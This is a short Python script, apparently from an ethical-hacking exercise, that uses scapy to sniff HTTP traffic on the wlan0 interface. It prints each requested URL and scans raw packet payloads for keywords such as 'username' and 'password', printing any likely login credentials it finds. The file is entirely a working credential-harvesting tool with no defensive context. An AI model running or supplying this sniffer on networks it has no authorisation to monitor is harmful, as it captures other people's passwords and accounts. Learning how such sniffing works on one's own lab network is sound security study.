#!usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def getUrl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def getLoginInfo(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "Login"]
        for keyword in keywords:
            if keyword in str(load):
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = getUrl(packet)
        print("[+] HTPP Request >> " + str(url))

        loginInfo = getLoginInfo(packet)
        if loginInfo:
            print("\n\n[+] Possible usernames/passwords > " + str(loginInfo) + "\n\n")


sniff("wlan0")